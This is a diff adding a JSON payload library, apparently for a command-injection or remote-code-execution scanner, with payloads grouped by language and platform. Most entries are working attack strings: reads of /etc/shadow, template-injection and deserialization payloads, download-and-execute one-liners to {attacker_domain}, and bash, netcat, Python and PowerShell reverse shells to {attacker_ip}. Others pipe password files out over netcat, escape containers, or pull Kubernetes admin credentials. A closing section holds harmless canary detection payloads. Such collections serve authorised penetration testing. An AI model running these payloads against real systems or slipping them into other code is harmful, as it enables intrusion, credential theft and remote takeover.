@@ -1,0 +1,251 @@
+{
+    "payload_categories": {
+        "basic_enum": {
+            "unix": [
+                "id",
+                "whoami",
+                "uname -a",
+                "pwd",
+                "ls -la",
+                "ps aux"
+            ],
+            "windows": [
+                "whoami",
+                "ver",
+                "dir",
+                "tasklist",
+                "ipconfig"
+            ]
+        },
+        "file_operations": {
+            "unix": [
+                "cat /etc/passwd",
+                "cat /etc/shadow",
+                "head -n 10 /etc/passwd",
+                "tail -f /var/log/syslog",
+                "find / -name '*.conf' -type f 2>/dev/null"
+            ],
+            "windows": [
+                "type C:\\Windows\\System32\\drivers\\etc\\hosts",
+                "dir C:\\Windows\\System32\\drivers\\etc",
+                "dir C:\\Users"
+            ]
+        },
+        "network_operations": {
+            "unix": [
+                "ifconfig",
+                "netstat -tulpn",
+                "arp -a",
+                "ping -c 4 127.0.0.1"
+            ],
+            "windows": [
+                "ipconfig /all",
+                "netstat -ano",
+                "arp -a",
+                "ping -n 4 127.0.0.1"
+            ]
+        },
+        "code_execution": {
+            "nodejs": {
+                "child_process_exec": [
+                    "require('child_process').exec('whoami')",
+                    "require('child_process').exec('cat /etc/passwd | nc {attacker_ip} 443')",
+                    "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/{attacker_ip}/443 0>&1\"')"
+                ],
+                "pug_ssti": [
+                    "= 7 * 7",
+                    "= require('child_process').exec('whoami')"
+                ],
+                "ejs_ssti": [
+                    "<%= 7 * 7 %>",
+                    "<%= require('child_process').exec('whoami') %>"
+                ],
+                "handlebars_ssti": [
+                    "{{7 * 7}}",
+                    "{{lookup (lookup (lookup (lookup __proto__ 'constructor') 'constructor') 'call') 'whoami'}}"
+                ],
+                "vm_eval": [
+                    "(new (require('vm').Script)(`require('child_process').exec('whoami')`)).runInThisContext()",
+                    "vm.runInNewContext(`require('child_process').exec('curl http://{attacker_domain}/x.sh | sh')`, {}, { timeout: 1000 })"
+                ],
+                "deserialization": [
+                    "const serialize = require('node-serialize'); const payload = \"{\\\"rce\\\": \\\"_$$ND_FUNC$$_function(){require('child_process').exec('id');}()\\\"}\"; serialize.unserialize(payload);"
+                ]
+            },
+            "python": {
+                "os_system": [
+                    "os.system('whoami')",
+                    "os.system('cat /etc/passwd')",
+                    "os.system('bash -i >& /dev/tcp/{attacker_ip}/443 0>&1')"
+                ],
+                "subprocess": [
+                    "subprocess.call(['whoami'], shell=True)",
+                    "subprocess.Popen('cat /etc/passwd', shell=True).communicate()"
+                ],
+                "jinja2_ssti": [
+                    "{{7*7}}",
+                    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+                    "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
+                    "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}"
+                ]
+            },
+            "php": {
+                "exec_system": [
+                    "system('whoami')",
+                    "exec('whoami')",
+                    "shell_exec('whoami')",
+                    "passthru('whoami')",
+                    "eval('system(\"whoami\")')",
+                    "preg_replace('/.*/e','system(\"whoami\")','')"
+                ],
+                "eval": [
+                    "assert(\"system('whoami')\");",
+                    "@create_function(\"\", \"system('ls');\");"
+                ],
+                "deserialize": [
+                    "$payload = file_get_contents('php://input'); $object = unserialize($payload);"
+                ]
+            },
+            "java": {
+                "runtime_exec": [
+                    "Runtime.getRuntime().exec(\"whoami\")",
+                    "new ProcessBuilder(\"whoami\").start()",
+                    "Runtime.getRuntime().exec(\"cat /etc/passwd\")"
+                ],
+                "freemarker_ssti": [
+                    "${7*7}",
+                    "${'freemarker.template.utility.Execute'?new()('id')}",
+                    "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ ex('id')}"
+                ],
+                "velocity_ssti": [
+                    "#set($x='') $x",
+                    "#set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $d=$ex.getInputStream() $d=$chr.toChars($d.readBytes($d.available())) $out=$str.valueOf($d) $out"
+                ],
+                "thymeleaf_ssti": [
+                    "[[${7*7}]]",
+                    "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]"
+                ],
+                "deserialization": [
+                    "new ObjectInputStream(new ByteArrayInputStream(payload)).readObject(); // ysoserial gadget"
+                ],
+                "expression": [
+                    "javax.script.ScriptEngineManager m = new javax.script.ScriptEngineManager(); m.getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('id')\");"
+                ]
+            },
+            "dotnet": {
+                "process_start": [
+                    "Process.Start(\"whoami.exe\")",
+                    "Process.Start(\"cmd.exe\", \"/c whoami\")",
+                    "new Process { StartInfo = new ProcessStartInfo { FileName = \"cmd.exe\", Arguments = \"/c whoami\" } }.Start()"
+                ],
+                "deserialize": [
+                    "new BinaryFormatter().Deserialize(new MemoryStream(payload)); // Gadget execution"
+                ]
+            },
+            "ruby": {
+                "kernel_system": [
+                    "system('whoami')",
+                    "`whoami`",
+                    "Kernel.system('whoami')",
+                    "Kernel.exec('whoami')"
+                ],
+                "erb_ssti": [
+                    "<%= 7 * 7 %>",
+                    "<%= `whoami` %>",
+                    "<%= File.open('/etc/passwd').read %>"
+                ]
+            },
+            "perl": {
+                "system_backticks": [
+                    "system('whoami')",
+                    "`whoami`",
+                    "exec('whoami')"
+                ]
+            },
+            "go": {
+                "os_exec": [
+                    "exec.Command(\"whoami\").Output()",
+                    "exec.Command(\"bash\", \"-c\", \"whoami\").Output()",
+                    "exec.Command(\"cat\", \"/etc/passwd\").Output()"
+                ]
+            },
+            "javascript": [
+                "require('child_process').exec('whoami')",
+                "eval(\"require('child_process').exec('whoami')\")"
+            ]
+        },
+        "download_execute": {
+            "unix": [
+                "curl http://{attacker_domain}/shell.sh | sh",
+                "wget http://{attacker_domain}/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh",
+                "python3 -c \"import urllib.request; exec(urllib.request.urlopen('http://{attacker_domain}/shell.py').read())\""
+            ],
+            "windows": [
+                "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{attacker_domain}/shell.ps1')\"",
+                "certutil -urlcache -f http://{attacker_domain}/shell.exe shell.exe && shell.exe"
+            ]
+        },
+        "reverse_shells": {
+            "unix": [
+                "bash -i >& /dev/tcp/{attacker_ip}/443 0>&1",
+                "nc -e /bin/sh {attacker_ip} 443",
+                "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{attacker_ip}\",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"])'"
+            ],
+            "windows": [
+                "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',443); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()\""
+            ]
+        },
+        "container_escape": {
+            "docker": [
+                "cat /proc/1/environ",
+                "nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh",
+                "cp /bin/sh /host/tmp/sh && chmod +s /host/tmp/sh"
+            ],
+            "kubernetes": [
+                "kubectl get pods --namespace kube-system",
+                "kubectl run rce --image=alpine --restart=Never --command -- sh -c 'nc {attacker_ip} 443 -e /bin/sh'",
+                "kubectl exec -n kube-system kube-apiserver-0 -- cat /etc/kubernetes/admin.conf"
+            ]
+        }
+    },
+    "detection_payloads": {
+        "unix": [
+            "echo DETECTION_{canary}",
+            "sleep 5",
+            "printf 'canary:%s' $(hostname)"
+        ],
+        "windows": [
+            "echo DETECTION_{canary}",
+            "timeout /T 5",
+            "powershell -Command \"Start-Sleep -Seconds 3; Write-Output 'DETECTION_{canary}'\""
+        ],
+        "php": [
+            "echo 'DETECTION_{canary}';",
+            "error_log('DETECTION_{canary}');"
+        ],
+        "python": [
+            "print('DETECTION_{canary}')",
+            "import time; time.sleep(2)"
+        ],
+        "nodejs": [
+            "console.log('DETECTION_{canary}')",
+            "setTimeout(()=>console.log('timer {canary}'), 1000)"
+        ],
+        "java": [
+            "System.out.println(\"DETECTION_{canary}\");",
+            "Thread.sleep(2000);"
+        ],
+        "dotnet": [
+            "Console.WriteLine(\"DETECTION_{canary}\");",
+            "System.Threading.Thread.Sleep(2000);"
+        ],
+        "docker": [
+            "echo 'detector:{canary}'",
+            "sleep 2"
+        ],
+        "kubernetes": [
+            "kubectl get pods --namespace default",
+            "echo 'kube-detect-{canary}'"
+        ]
+    }
+}
